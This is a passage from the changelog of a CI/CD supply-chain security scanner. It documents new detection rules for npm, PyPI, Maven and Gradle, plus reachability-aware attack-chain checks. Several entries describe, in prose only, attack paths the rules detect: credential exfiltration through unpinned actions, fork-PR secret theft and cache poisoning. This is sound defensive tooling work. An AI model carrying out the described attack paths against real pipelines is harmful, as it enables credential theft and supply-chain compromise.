  needed no import changes. Adding a fourth ecosystem (Go modules,
  RubyGems) now costs ~60 lines of adapter instead of ~280.

## [1.2.0] - 2026-05-20

### Added

- **Gradle `libs.versions.toml` version-catalog resolution.**
  Closes the last open entry in the dependency-supply-chain
  follow-ups section of the roadmap. ``_parse_versions_catalog``
  walks the conventional ``gradle/libs.versions.toml`` file
  (discovered by the same scan-root-bounded upward walk that
  ``gradle.properties`` uses) and builds a ``{dotted_name:
  (group, artifact, version)}`` index. Both library-entry shapes
  Gradle accepts are supported:

  - ``module = "group:artifact"`` (single-string form)
  - ``group = "..." , name = "..."`` (two-field form)

  Versions resolve through one of:

  - ``version = "X"`` (inline literal)
  - ``version.ref = "name"`` (alias into ``[versions]``)
  - ``version = { strictly|require|prefer = "X" }`` (rich
    constraint)

  ``_parse_gradle`` then scans build scripts for
  ``<config> libs.<dot.path>`` references (Groovy and Kotlin DSL
  syntax both accepted, with optional parens) and synthesizes a
  ``MavenDependency`` from the catalog entry the accessor resolves
  to. ``libs.versions.X`` / ``libs.bundles.X`` / ``libs.plugins.X``
  namespaces are deliberately skipped so accessing a version-only
  ref doesn't materialize a phantom coordinate. MVN-001 (floating-
  range) and MVN-006 (compromised package) now fire on catalog-
  referenced pins in modern Gradle projects that hold every
  version in ``libs.versions.toml``, the standard idiom in 2024+
  Gradle builds.

- **Gradle `gradle.properties` cross-file resolution.** Extends the
  in-file ``${propName}`` resolution shipped earlier this cycle to
  the sibling ``gradle.properties`` file. ``MavenContext.from_path``
  walks upward from each ``build.gradle`` / ``build.gradle.kts``
  file toward the scan root and merges every ``gradle.properties``
  it finds along the way (closest-to-the-script wins on conflict,
  matching Gradle's subproject-overrides-root semantics); in-file
  ``ext { ... }`` / ``def`` / ``val`` declarations override the
  cross-file map. The walk deliberately stops at the scan root so
  ``~/.gradle/gradle.properties`` and other out-of-tree ancestors
  are never read — pipeline-check stays a hermetic, repo-only
  scanner. MVN-001 (floating-range) and MVN-008 (cooldown) now see
  the literal version on Gradle multi-project layouts where the
  versions live in the root ``gradle.properties``, the standard
  setup in real-world projects.

- **`pyproject.toml` parser for the pypi provider.** Brings the
  existing PYPI-004 (VCS mutable ref) and PYPI-006 (compromised
  package) rules to bear on modern Python repos that hold their
  dependency surface in ``pyproject.toml`` rather than
  ``requirements.txt``. ``_parse_pyproject_toml`` walks:

  - **PEP 621**: ``[project].dependencies`` array of PEP 508
    strings + ``[project.optional-dependencies]`` table of arrays.
  - **Poetry**: ``[tool.poetry.dependencies]``,
    ``[tool.poetry.dev-dependencies]``, and
    ``[tool.poetry.group.<name>.dependencies]``; string,
    table-with-version, table-with-git/url, and multi-constraint
    list forms all supported. The special ``python`` entry is
    dropped (runtime requirement, not a dep). ``rev`` is preferred
    over ``tag`` / ``branch`` for git deps so a SHA-pinned
    coordinate passes PYPI-004. Path / file deps are skipped
    (local sources aren't a supply-chain surface).
  - **PEP 518/517**: ``[build-system].requires``.

  ``poetry.lock`` was already supported as a resolved lockfile;
  this slot adds the manifest side for projects that don't commit
  the lock. PYPI-001 (version pin) and PYPI-002 (hash pin) silent-
  pass on ``pyproject.toml`` because manifests legitimately use
  caret / tilde / range constraints (the resolved lockfile is
  where the exact pin lands). Reuses the existing
  ``RequirementsFile`` shape so PYPI-004 and PYPI-006 work
  unchanged.

- **Gradle in-file property resolution for MVN-001 / MVN-008.**
  ``_parse_gradle`` now extracts user-declared properties from
  every common in-file Gradle shape (``ext { foo = '1.0' }``
  blocks, bare ``ext.foo = '1.0'`` lines, Groovy ``def foo = '1.0'``
  declarations, Kotlin DSL ``val foo: String = "1.0"``
  declarations) and substitutes ``$foo`` / ``${foo}`` references
  in coordinate version strings before the rule pack sees them.
  MVN-001 (floating-range / LATEST) and MVN-008 (cooldown via
  ``--resolve-remote``) now see the literal version the Gradle
  build actually pins on every project that holds its versions in
  any of the above shapes. Last-write-wins on duplicate names,
  matching Gradle's in-script semantics; undeclared references
  are preserved verbatim so the rule still flags the dynamic-
  version case as it did before. Cross-file resolution
  (``gradle.properties``, ``libs.versions.toml`` version
  catalogs) is covered by the dedicated entries above;
  ``rootProject.ext.X`` indirection remains intentionally out of
  scope for this pass.

- **GHA-060 + GL-035 + BB-031: pip install without
  ``--require-hashes``.** Closes the PYPI-007 slot from the
  dependency-supply-chain roadmap, mirroring the NPM-010 trilogy
  (GHA-059 + GL-034 + BB-030) on the PyPI side. Fires MEDIUM once
  per pipeline file when:

  1. The pipeline runs a real ``pip install`` invocation (``pip
     install``, ``pip3 install``, ``python -m pip install``) that
     isn't a tooling-bootstrap on the allowlist;
  2. No step in the pipeline passes ``--require-hashes`` AND no
     step uses a hash-pinning manager (``uv sync`` / ``uv pip
     install``, ``poetry install``, ``pipenv install --deploy``).

  Tooling-bootstrap allowlist (silent-passes): ``pip install
  --upgrade pip / setuptools / wheel / virtualenv / pip-tools``,
  ``pip install pipx / pip-audit / cyclonedx-bom / semgrep`` and
  the package-manager bootstraps themselves (``poetry``, ``uv``,
  ``pipenv``, ``hatch``, ``build``, ``twine``).

  Hash-pinned install is the PyPI equivalent of npm's
  lockfile-integrity guarantee: it refuses to install any tarball
  whose SHA-256 doesn't match a recorded entry. PyPI
  maintainer-account compromises (ctx 2022,
  requests-darwin-lite 2023) shipped malicious sdists / wheels
  under existing version pins; ``--require-hashes`` would have
  refused the swap.

  Mapped across 13 standards (same set as the NPM-010 trilogy).
  Brings the GHA pack to 63 rules, GitLab to 37, Bitbucket to 31.

- **Yarn 2+ / Berry lockfile parser.** Closes the Berry gap on the
  npm provider. ``NpmContext`` now sniffs the ``__metadata:`` block
  inside ``yarn.lock`` and routes Berry bodies through
  ``_parse_yarn_berry_lock`` + ``_synthesize_yarn_berry_lock``;
  Classic bodies continue to flow through the existing yarn-1 path.
  Both synthesizers project to the same npm-7+ ``packages`` shape,
  so NPM-002 (missing integrity), NPM-003 (non-registry source),
  NPM-006 (compromised version), and NPM-009 (new-transitive diff
  via ``--npm-base-ref``) run on Berry locks with zero per-rule
  changes.

  Berry-specific surface mapped:

  - ``resolution: "name@npm:1.2.3"`` → registry ``resolved``
    URL on ``https://registry.yarnpkg.com``; ``checksum: <hex>`` →
    ``integrity: sha512-<hex>`` (NPM-002 reads the presence signal,
    not the encoding).
  - ``workspace:`` / ``link:`` / ``portal:`` → ``file:`` resolved
    with ``link: true`` so NPM-002 correctly skips entries that
    have no tarball.
  - ``patch:`` wraps a real resolution; the classifier unwraps
    one level so the underlying ``npm:`` / ``git:`` / ``http:``
    is what NPM-003 sees.
  - ``git:host:owner/repo.git`` → ``git+ssh://`` so NPM-003's
    transport-prefix classifier flags it.

  Includes a defensive guard: a Berry body fed to the yarn-1 parser
  (e.g. via a wrongly-flagged file) still won't poison NPM-* output
  because the yarn-1 synthesizer already drops the ``__metadata``
  entry by name; that guard stays.

- **GL-034 + BB-030 npm install without audit-signatures (parity
  with GHA-059).** Ports the GHA-059 detector to the GitLab CI and
  Bitbucket Pipelines providers. Same shape: fires MEDIUM once per
  pipeline file when an `npm`/`pnpm` install verb appears in any
  job's script and `npm audit signatures` / `pnpm audit signatures`
  does not. GitLab's check also recognizes installs / audits in
  the document-level `before_script:` / `after_script:` so a
  workflow-wide verification step counts for every job that
  doesn't override it. Yarn / Bun-only pipelines pass silently in
  both. Closes the NPM-010 roadmap slot across all three CI
  providers (GHA + GitLab + Bitbucket) and brings the
  GitLab pack to 36 rules and Bitbucket to 30.

- **GHA-059 npm install without registry-signature verification.**
  Closes the NPM-010 slot from the post-1.0 roadmap on the GitHub
  Actions side. Fires once per workflow when at least one step runs
  ``npm ci`` / ``npm install`` / ``npm i`` / ``pnpm install`` /
  ``pnpm i`` / ``pnpm ci`` and no step anywhere in the same workflow
  runs ``npm audit signatures`` or ``pnpm audit signatures``. Yarn /
  Bun-only workflows pass silently because the ``audit signatures``
  primitive is npm-CLI-specific (Yarn Berry's ``yarn npm audit``
  does not yet verify registry trusted-publisher records). Severity
  MEDIUM. Maps to OWASP CICD-SEC-3, ESF-S-VERIFY-DEPS, CWE-345, plus
  the canonical supply-chain controls in the 12 other registered
  standards.

  Lockfile pinning (NPM-002, NPM-006) only guarantees the bytes
  installed match the bytes the lockfile recorded; ``npm audit
  signatures`` is what verifies those bytes were signed by the
  registry's trusted publisher for that package. The Shai-Hulud /
  TanStack / axios family of npm-worm compromises rode the gap
  between the two: the lockfile faithfully pinned what the
  maintainer's compromised account published, and integrity hashes
  matched the malicious tarball. Registry trusted-publisher records
  are the missing leg, and ``audit signatures`` is the gate that
  consumes them.

### Changed

- **Docs site navigation regrouped under six intent-based tabs.**
  The mkdocs nav had grown to ~15 top-level entries, one per page,
  which overflowed Material's tab bar and read as a flat dump.
  Pages are now grouped as **Home**, **Getting started** (Usage,
  Configuration, CI gate, Output, Stability), **Coverage**
  (Providers, Standards, Comparison, GOAT bench), **Concepts**
  (Scoring model, Threat model, Attack chains), **Integrations**
  (MCP, VS Code extension), and **Contributing**. No files moved,
  so deep links from external sources still resolve.

### Fixed

- **Doc-accuracy sweep on hand-written prose.** The headline counts
  and generated provider / standards pages were already lock-tested,
  but several free-form prose claims had drifted from the live
  registries. README's per-provider rows had stale counts for SCM
  (42 → 47), npm (9 → 10, plus a "NPM-009..010 reserved" sentence
  that NPM-009 had since invalidated), and Maven (7 → 8, missing
  the MVN-008 cooldown entry). README's `--scm-platform` flag
  description said "37-rule pack" instead of 47, and the
  `--man [TOPIC]` list omitted the registered ``inventory`` and
  ``explain`` topics. ``docs/stability.md`` named ``evaluate_gate``
  and a nonexistent ``ReporterRegistry`` as part of the public
  surface (the real ``__all__`` is twenty names long) and
  referenced an unreal ``--gate-off`` flag. ``docs/vscode.md``
  pointed at a non-existent ``--threatmodel`` flag (the real
  invocation is ``--output threatmodel``). The
  ``writing_a_custom_rule.md`` / ``writing_a_chain.md`` tutorials
  still cited a "590+ checks across 19 providers" / "36 chain
  examples" snapshot. And both ``docs/usage.md`` and
  ``docs/config.md`` overstated the env-var / config-file surface
  ("every CLI flag") relative to the actual ``_TOPLEVEL_KEYS`` /
  ``_GATE_KEYS`` allowlist in ``pipeline_check/core/config.py``.
  All thirteen prose sites now match the live registries and
  ``__all__``.

## [1.1.0] - 2026-05-19

### Added

- **NPM-009 new-transitive-dependency diff gate.** Fires HIGH per
  lockfile when a package name appears in the current lockfile
  that wasn't in the same lockfile at a base git ref, after
  subtracting top-level direct dependencies (those are NPM-008's
  territory). Closes the gap the axios -> plain-crypto-js
  backdoor (March 2026) exercised: a maintainer-controlled patch
  release silently added a new transitive that lockfile-pinning
  consumers had no signal for, because the lockfile faithfully
  pinned what the manifest resolved to.

  New ``--npm-base-ref <ref>`` CLI flag opts the rule in: each
  loaded lockfile's contents at ``<ref>`` is materialized via the
  existing hardened ``git_show`` helper (the same one
  ``--baseline-from-git`` uses, so the leading-dash argument-
  injection guard and ``--end-of-options`` defense carry through),
  parsed via the same per-filename dispatcher
  (``_parse_lock_text``) that handles on-disk loads, and stashed
  on ``NpmContext.base_locks``. The dispatcher was factored out of
  ``NpmContext.from_path`` so both the current-load and base-load
  paths share one parser per format
  (``package-lock.json`` / ``npm-shrinkwrap.json`` /
  ``pnpm-lock.yaml`` / ``yarn.lock``).

  ``NpmProvider.post_filter`` gained a second opt-in branch
  alongside ``--resolve-remote``: when ``--npm-base-ref`` is set
  and lockfiles are loaded, the provider calls
  ``load_base_locks_via_git(ctx, ref, npm_path)`` before the
  ``--resolve-remote`` registry-fetch branch. Failures (git not
  on PATH, ref missing, file didn't exist at the base ref, body
  unparseable) land in ``ctx.warnings`` and the rule silent-
  passes per-lockfile so a brand-new lockfile in this branch
  doesn't fail CI on its own. The rule also passes silently when
  ``--npm-base-ref`` was never set, mirroring NPM-008's no-flag-
  no-CI-failure contract.

  Rule diffs by package *name* only — version bumps of an
  existing transitive are out of scope (NPM-006 covers known-bad
  version pins; NPM-008 covers fresh-publication windows).
  Install-path name extraction (``_name_from_install_path``)
  handles npm 7+ ``node_modules/<name>``, scoped
  ``node_modules/@scope/<name>``, nested
  ``node_modules/foo/node_modules/bar``, pnpm / yarn-1
  ``+<version>`` multi-version disambig suffix, and the npm 6
  legacy ``foo/bar`` tree shape, so the diff is consistent
  across all four supported lockfile formats.

  Twenty-nine new tests in ``tests/npm/test_npm009.py`` cover the
  name-extractor across every supported install-path shape, the
  per-lock package-name collector (root-entry skip, disambig
  dedupe), the rule (silent-pass without base, silent-pass with
  no matching base, fires on new transitive, doesn't fire on
  new direct, doesn't fire on version bump, 5-item description
  truncation + location cap, subset-of-base, pnpm disambig
  collapse), and the git loader (happy path, missing ref, parse
  error, scan-root-as-file, yarn-1 round-trip). Bumps
  test_rule_framework npm count 9 → 10; OWASP CICD-SEC-3 +
  CICD-SEC-8 mapping; regenerated npm provider doc + OWASP
  standard doc.

- **CONTRIBUTING.md.** Contributor onboarding page covering dev
  setup (``make install`` vs. ``pip install -e ".[dev]"``), the
  test / lint / strict-mypy commands CI runs, the provider- and
  standards-doc regeneration contract, the American-English rule,
  the rule-addition workflow, and the PR / commit / release
  conventions that previously only lived in ``CLAUDE.md``. Points
  back at ``CLAUDE.md`` for the exhaustive English-variant pair
  table and the maintainer-only release steps so the two files
  don't drift. README gains a ``🤝 Contributing`` section linking
  out to it (plus ``CLAUDE.md`` and ``SECURITY.md``) so the doc is
  discoverable above the License footer.

- **MVN-008 cooldown gate + maven registry fetcher.** Completes
  the cooldown-gate trio (NPM-008 + PYPI-008 already landed) by
  closing the Maven Central half. Same shape: opt-in via
  ``--resolve-remote``; fetches per-coordinate metadata from the
  Maven Central search API
  (``https://search.maven.org/solrsearch/select?core=gav``), reads
  the per-version ingest timestamp from each ``response.docs[]``
  entry's ``timestamp`` field (millisecond Unix epoch UTC),
  populates ``MavenContext.publish_times: dict["group:artifact",
  dict[version, ts_utc]]``, and MVN-008 fires when any non-managed
  ``<dependency>`` was published within the cooldown window
  (default 7 days). When the same version is double-listed (rare
  but possible across snapshot ingests) the earlier timestamp is
  kept; negative / malformed timestamps drop on the floor.

  New ``pipeline_check/core/checks/maven/registry_fetcher.py``
  module + ``MavenContext.publish_times`` field + ``MavenProvider.
  post_filter`` hook mirror the npm / pypi template exactly so the
  three providers stay shape-consistent. ``MavenChecks`` dispatcher
  gained the same backward-compatible two-argument ctx-passing
  pattern (``inspect.signature``-driven) so MVN-008 can receive
  ``MavenContext`` without forcing the older single-arg rules
  (MVN-001..007) to change. ``iter_resolved_coordinates()`` helper
  surfaces ``(group, artifact, resolved_version)`` triples to the
  provider with ``${prop}`` substitution applied and managed /
  unresolved entries filtered out.

  Rule scope: concrete release coordinates only. ``-SNAPSHOT``
  (MVN-002 territory), Maven version ranges (``[1.0,2.0)``),
  ``LATEST`` / ``RELEASE`` keywords, the Gradle ``+`` /
  ``1.2.+`` wildcards, and unresolved ``${...}`` literals all
  skip silently. ``<dependencyManagement>`` is skipped because
  those are version-management declarations, not real
  consumption. ``settings.xml`` short-circuits to pass since it
  has no project dependencies. Twenty-three new tests in
  ``tests/maven/test_mvn008.py`` cover the parser (``gav`` docs,
  double-listed-version dedup, negative-timestamp rejection,
  malformed inputs), ``fetch_publish_times`` (happy / dedup / 404
  warning / cache short-circuit / empty-coordinate skip), the
  ``_is_concrete_release`` classifier (plain / SNAPSHOT / range /
  LATEST / RELEASE / Gradle wildcards / empty), the cooldown
  math, and the rule (silent-pass / fires / passes-old /
  SNAPSHOT-skip / range-skip / property-resolution / unresolved-
  property-skip / unknown-coordinate-skip / managed-skip /
  settings.xml-skip / confidence-default). Bumps
  test_rule_framework maven count 7 → 8; OWASP CICD-SEC-3 +
  CICD-SEC-8 mapping; README maven range MVN-007 → MVN-008;
  regenerated provider + OWASP standard docs.

- **PYPI-008 cooldown gate + pypi registry fetcher.** Closes the
  PyPI half of the cooldown-gate trio (NPM-008 / MVN-008 land in
  the same cycle). Same template: opt-in via ``--resolve-remote``;
  fetches per-package metadata from the PyPI JSON API
  (``https://pypi.org/pypi/<name>/json``), reads the per-version
  upload timestamps from ``releases.<version>[].upload_time_iso_8601``
  (legacy ``upload_time`` field accepted too, treated as UTC),
  populates ``PypiContext.publish_times``, and PYPI-008 fires when
  a direct ``name==version`` requirement was published within the
  cooldown window (default 7 days). Per-version timestamp is the
  MIN across the file records (the moment the first artifact for
  that release landed on the index — that's what the cooldown
  measures from). Yanked versions (empty file lists) drop on the
  floor. PEP 503 name normalization runs on both the fetcher's
  cache key and the rule's lookup so ``Pillow`` / ``pillow`` /
  ``Pil_Low`` collapse to one fetch.

  New ``pipeline_check/core/checks/pypi/registry_fetcher.py``
  module + ``PypiContext.publish_times`` field + ``PypiProvider.
  post_filter`` hook mirror the npm template exactly so the two
  providers stay shape-consistent. ``PypiChecks`` dispatcher
  gained the same backward-compatible two-argument ctx-passing
  pattern npm got. MVN-008 follow-up can layer on the same
  template in its own provider.

  Rule scope: ``==version`` exact pins only (with optional
  ``[extras]`` and ``; markers`` suffixes stripped). Range specs
  (``>=``, ``~=``, ``<``), VCS / URL / editable lines, and
  unpinned specs skip silently. Twenty-eight new tests in
  ``tests/pypi/test_pypi008.py`` cover the parser (min-across-
  files, legacy ``upload_time`` field, yanked-version drop,
  malformed inputs), ``fetch_publish_times`` (happy / dedup /
  404 warning / cache short-circuit), the spec extractor
  (bare / extras / markers / case-folding / range / VCS), the
  cooldown math, and the rule. Bumps test_rule_framework pypi
  count 6 → 7; OWASP CICD-SEC-3 + CICD-SEC-8 mapping; README
  pypi range PYPI-006 → PYPI-008; regenerated provider + OWASP
  standard docs.

- **NPM-008 cooldown gate + npm registry fetcher infrastructure.**
  New rule that fires when a direct ``package.json`` dependency
  was published to ``registry.npmjs.org`` within the cooldown
  window (default 7 days), catching the same takedown-window
  attacks (Shai-Hulud / TanStack / axios → plain-crypto-js,
  @ctrl/* maintainer-account takeovers) that pure lockfile or
  SHA pinning is blind to. Opt-in via ``--resolve-remote``:
  passes silently when the flag is off so the rule's absence
  isn't a CI failure on the default no-network path.

  New ``pipeline_check/core/checks/npm/registry_fetcher.py``
  module mirrors the GHA resolver pattern
  (``RegistryMetadataFetcher`` Protocol + ``HttpRegistryFetcher``
  stdlib-only impl + ``FileSystemCache`` with 7-day TTL +
  ``default_cache_dir()`` platform helper). The fetcher returns
  ``None`` on 404 / network error so failures land as warnings
  on ``context.warnings`` and the scan continues — strictly
  additive resolution, mirrors the GHA contract.

  The ``NpmProvider.post_filter`` hook walks every direct
  dependency in every loaded ``package.json``, fetches per-
  package metadata, and populates the new
  ``NpmContext.publish_times: dict[name, dict[version, ts_utc]]``
  the rule reads. Per-package result is cached on disk so re-runs
  in the same week skip network entirely (toggle via
  ``--no-cache``). Scoped names (``@scope/foo``) are URL-encoded;
  responses over 10 MiB are rejected as a precaution against
  bloat / misrouted servers.

  ``NpmChecks`` dispatcher gained a small extension: rules that
  declare a second positional parameter receive the full
  ``NpmContext`` alongside their per-target argument. Existing
  one-arg rules are unaffected; NPM-008 is the first consumer.

  Rule scope: exact-version specs only (``1.2.3`` / ``=1.2.3`` /
  ``v1.2.3``, with pre-release suffixes kept). Range specs
  (``^1.2.3`` / ``~1.2.3`` / ``>=1.2.3``), dist-tag specs
  (``latest``), and source specs (``file:`` / ``workspace:`` /
  ``git+...``) skip silently — the cooldown applies to a
  specific version literal because that's what the maintainer
  chose to pin. PYPI-008 and MVN-008 follow-ups can layer on top
  of the same fetcher template in their own providers.

  Twenty-seven new tests in ``tests/npm/test_npm008.py`` cover
  ``_parse_publish_times`` (happy path, malformed timestamps,
  non-JSON, top-level-non-dict, missing time block),
  ``fetch_publish_times`` (happy / dedup / 404 warning / cache
  short-circuit), the version-spec regex (bare / ``=`` / ``v``
  / pre-release / caret / tilde / dist-tag), the cooldown math
  (fresh / old / tz-naive), and the rule itself (silent pass
  without metadata, fires on fresh, passes on old, ignores
  ranges, ignores unresolved packages, covers devDependencies).

- **Org-wide fleet scanner (`pipeline_check fleet`) phase 1.** New
  CLI subcommand that reads a YAML list of GitHub-style
  ``owner/repo`` coordinates, shallow-clones each into a tmpdir,
  runs the existing scan in a fresh subprocess so per-repo state
  stays isolated, and writes a unified output tree:
  ``<output-dir>/<owner>/<repo>/findings.json`` per repo plus a
  top-level ``fleet.json`` aggregate and ``fleet.md`` digest
  (org-wide severity totals + per-repo posture table ranked worst
  → best + warnings). Closes the "do we even have visibility?"
  roadmap gap without dragging in a SaaS posture-management tool.
  Compounds with the existing ``pipeline_check history`` command:
  the same fleet output directory can be re-rendered as a
  static-HTML dashboard. A single repo's clone or scan failure
  becomes a per-repo warning on the digest rather than aborting
  the whole run; per-repo timeout (``--per-repo-timeout``,
  default 600s) bounds any one stuck repo's blast radius. Phase
  1 limits coordinates to GitHub-style ``owner/repo`` (GitLab
  ``group/sub/project`` and Bitbucket ``workspace/slug`` are
  deferred and rejected at parse time with an explicit error so
  the user sees the limitation immediately). Deferred to phase 2:
  ``--from-org`` SCM API enumeration, ``--include`` /
  ``--exclude`` globs, ``--baseline-dir`` regression diffing,
  per-repo SARIF / ``threats.md`` outputs, and forwarding
  arbitrary ``pipeline_check`` flags to the per-repo subprocess.
  Twenty new tests in ``tests/test_fleet.py`` cover repo-list
  parsing (flat list / mapping-with-``repos`` / malformed YAML /
  non-string / wrong-shape coordinate / GitLab-style rejection),
  digest rendering (ranking, warnings, truncation), the
  orchestrator's clone-failure / scan-failure / corrupt-findings
  paths, and CLI integration via ``CliRunner``.

- **Dedicated `docs/vscode.md` reference page for the VS Code
  extension.** Promotes editor coverage from a two-paragraph
  subsection of `usage.md` to a top-level docs page with install
  recipes (Marketplace + Open VSX + CLI), the pilot-coverage trigger
  table for all 10 single-file providers, feature reference
  (inline diagnostics, Findings activity-bar panel, status-bar tally,
  per-file CodeLens, `Alt+F8` keyboard nav, `severityThreshold` /
  `disabledProviders` quieting), the full `pipelineCheck.*` settings
  table, commands, workspace-trust posture, an architecture diagram
  of the TypeScript client ↔ `pipeline_check.lsp` server link, a
  non-VS Code editor section (Cursor, Windsurf, VSCodium, Neovim,
  Helix), a CLI-vs-extension feature matrix, and a troubleshooting
  block. Added to the mkdocs nav after MCP; the homepage feature
  card and the trimmed `usage.md` blurb now link to it.

- **`[lsp]` optional install extra surfaces the Language Server.**
  ``pip install pipeline-check[lsp]`` pulls ``pygls>=2.1.0`` and
  ``lsprotocol>=2025.0.0``, the floor versions the
  [Pipeline-Check VS Code extension](https://github.com/greylag-ci/pipeline-check-vscode)
  is built against (older pygls releases break the server). The base
  install still carries no LSP SDK, keeping the AWS-Lambda /
  minimal-install paths slim. README gains an "Editor diagnostics
  (LSP)" row in the key-features table pointing at the extension and
  the supported single-file provider set (github, gitlab, azure,
  bitbucket, circleci, cloudbuild, buildkite, drone, jenkins,
  dockerfile). Closes the install-instructions gap left by the
  initial LSP-server landing.

- **`ResourceAnchor` foundation for cross-provider reachability
  (phase 0).** `Finding` gains a new
  ``resource_anchors: tuple[ResourceAnchor, ...]`` field, the
  cross-provider counterpart to ``job_anchors``. Where
  ``job_anchors`` ties findings to the same job in one pipeline
  file, ``resource_anchors`` ties them to the same external
  resource (an IAM role ARN, an ECR repo URI, a K8s ServiceAccount,
  a Lambda function ARN, an OCI image). A new
  ``pipeline_check/core/checks/_primitives/anchors.py`` module
  ships per-kind canonicalizers (``iam_role``, ``iam_role_name``,
  ``ecr_repo``, ``lambda_fn``, ``k8s_sa``, ``oci_image``) so every
  rule that needs to emit an anchor goes through one helper and
  the two legs of a cross-provider chain mechanically agree on a
  canonical form. ``chains/base.py`` gains a ``group_by_anchor``
  helper alongside ``group_by_resource``, the chain-rule
  counterpart that intersects on ``(kind, identity)``. No chain
  rule consumes the new field yet; phase 1 starts the per-chain
  migration (AC-007, AC-016, AC-019, AC-011, AC-020, AC-017,
  AC-024, XPC-002, XPC-003). ``Finding.to_dict()`` surfaces
  ``resource_anchors`` under a new ``"resource_anchors"`` key
  when present.

- **SLSA Build L3 + Sigstore badges and install-time nudge.** The
  README header gains a SLSA Build L3 badge and a Sigstore-signed
  badge linking to the existing "Verifying a release" section, and
  the Quick start block carries a one-line note pointing users at
  the verifier recipe before they run ``pip install``. The
  provenance pipeline itself (release.yml +
  ``slsa-github-generator@v2.1.0`` + PyPI PEP 740 attestations)
  has been live since v1.0.4; this surfaces it above the fold.

- **Reachability-aware attack chains (AC-002 pilot).** The chain
  engine previously fired on co-occurrence: any two trigger findings
  on the same resource composed a chain. The new model intersects
  per-finding `job_anchors` (the job IDs each leg fires in) to
  confirm an executable connection between the two legs. `AC-002`
  (script injection to unprotected deploy) is the pilot: when
  `GHA-003` and `GHA-014` anchor on the same job, or when a
  `TAINT-001` / `TAINT-002` cross-job dataflow path lands in the
  same job as the ungated deploy, the chain emits with
  `confirmed_reachable=True`, confidence promoted to `HIGH`, and a
  short `reachability_note` citing the shared job(s). Unmigrated
  chains keep firing with `confirmed_reachable=False` (the additive
  default) so existing CI gates do not change. New flag
  `--chains-require-reachability` filters out unconfirmed chains
  for the strictest signal. JSON / SARIF / HTML / Markdown /
  terminal outputs all surface the new fields. `Finding` gained
  `job_anchors: tuple[str, ...]` and `path_evidence: tuple[str, ...]`;
  `GHA-003`, `GHA-014`, `TAINT-001`, and `TAINT-002` populate them.

- **Reachability-aware AC-022 (GitLab port).** `AC-022` (GitLab
  script injection meets unguarded deploy) now uses the same
  `job_anchors` intersection model as the `AC-002` pilot. `GL-002`
  records the job IDs whose ``script:`` interpolated an untrusted
  ``$CI_COMMIT_*`` / ``$CI_MERGE_REQUEST_*`` variable; `GL-004`
  records the job IDs that deploy without a ``when: manual`` /
  protected ``environment:`` gate. When the two sets share a job,
  the chain emits with `confirmed_reachable=True`, confidence
  promoted to `HIGH`, and a `reachability_note` citing the shared
  job(s). Disjoint sets fall back to the legacy co-occurrence
  signal (`confirmed_reachable=False`, weakest-leg confidence) so
  no existing gate changes.

- **TAINT-004 dotenv dataflow widens AC-022.** `TAINT-004` (GitLab
  cross-job taint via ``artifacts.reports.dotenv``) now populates
  `Finding.job_anchors` with the sink-side consumer job IDs and
  `Finding.path_evidence` with the rendered source-to-sink paths,
  mirroring the GHA `TAINT-002` shape. `AC-022` consumes those
  anchors when computing reachability: a producer-side `GL-002` in
  one job paired with a dotenv-routed sink that lands in the same
  job `GL-004` flagged as ungated now resolves to a confirmed
  chain, with the rendered dotenv path included in the narrative
  under "Dataflow evidence".

- **TAINT-008 extends-inheritance dataflow widens AC-022.**
  `TAINT-008` (GitLab cross-job taint via ``extends:`` template
  inheritance) populates `Finding.job_anchors` and
  `Finding.path_evidence` the same way `TAINT-004` does, so a
  tainted ``variables:`` block in a hidden template that's read
  unquoted in a downstream deploy job now contributes injection-
  side reachability for `AC-022`. Both of GitLab's cross-job
  dataflow channels (dotenv + extends) feed the AC-022 reachability
  check, closing the GitLab-side parity with the GHA pilot.

- **Reachability-aware AC-026 (Buildkite port).** `AC-026`
  (Buildkite injection lands on auto-deploy step with no manual
  gate) now uses the same `job_anchors` intersection model as the
  `AC-002` / `AC-022` chains. Buildkite pipelines are a flat list
  of steps rather than named jobs, so the anchor each leg surfaces
  is the step label (``key`` > ``label`` > ``steps[N]`` fallback).
  `BK-003` records the labels of steps whose ``command:``
  interpolated a tainted Buildkite variable; `BK-007` records the
  labels of deploy-named steps lacking a ``manual:`` / ``input:``
  gate. When the two sets share a step — the same step is the
  injection sink AND the unmanual deploy — the chain emits with
  `confirmed_reachable=True`, confidence promoted to `HIGH`, and a
  `reachability_note` citing the shared step(s). Disjoint sets
  fall back to the legacy file-co-occurrence signal. Buildkite has
  no TAINT-NNN family yet, so cross-step dataflow widening (meta-
  data / artifacts) is a follow-up.

- **Reachability-aware AC-018 (supply-chain leg).** `AC-018`
  (unpinned action lands on deploy job with no environment gate)
  now uses the `job_anchors` intersection model. `GHA-001` records
  the job IDs whose steps reference a tag-pinned or branch-pinned
  ``uses:``; `GHA-014`'s deploy-job anchors were already wired by
  the `AC-002` pilot. When the same job both pulls an unpinned
  upstream action AND is the ungated deploy, the chain emits with
  `confirmed_reachable=True`, confidence promoted to `HIGH`, and a
  `reachability_note` citing the shared job(s) — the tj-actions
  shape, where the compromised upstream code executes in the
  deploy job's own context with its environment secrets in scope.
  Disjoint anchors fall back to the legacy co-occurrence signal.

- **Reachability-aware AC-003 (credential-exfil leg).** `AC-003`
  (unpinned action to credential exfiltration) now intersects
  `GHA-001` ∩ `GHA-005` job anchors. `GHA-005` populates anchors
  per-scope: job-level / step-level static AWS keys anchor to the
  containing job; workflow-level ``env:`` inherits to every job
  and so unions with every job ID in the workflow. When the same
  job both pulls an unpinned upstream action AND can read
  ``$AWS_ACCESS_KEY_ID`` / ``$AWS_SECRET_ACCESS_KEY``, the chain
  emits with `confirmed_reachable=True`, confidence promoted to
  `HIGH`, and a `reachability_note` citing the shared job(s) —
  the canonical credential-exfiltration path. Disjoint anchors
  fall back to the legacy co-occurrence signal.

- **Reachability-aware AC-006 (cache poisoning).** `AC-006`
  (cache poisoning via untrusted trigger) now intersects
  `GHA-002` ∩ `GHA-011` job anchors. `GHA-002` populates anchors
  with the jobs that check out PR-head code; `GHA-011` populates
  anchors with the jobs whose ``actions/cache`` step has a tainted
  key. A shared job confirms the direct poisoning primitive — the
  malicious PR-head build script writes the same cache entry the
  job populates, which a later privileged run will restore.
  Disjoint anchors keep the legacy co-occurrence signal.

- **Reachability-aware AC-001 + AC-004 (fork-PR family).** Both
  `AC-001` (fork-PR credential theft) and `AC-004` (self-hosted
  runner persistent foothold) now use the `job_anchors`
  intersection model. AC-001 intersects `GHA-002` ∩ `GHA-005`
  (the same job both runs PR-head code AND can read long-lived
  AWS keys — the PyTorch supply-chain shape). AC-004 intersects
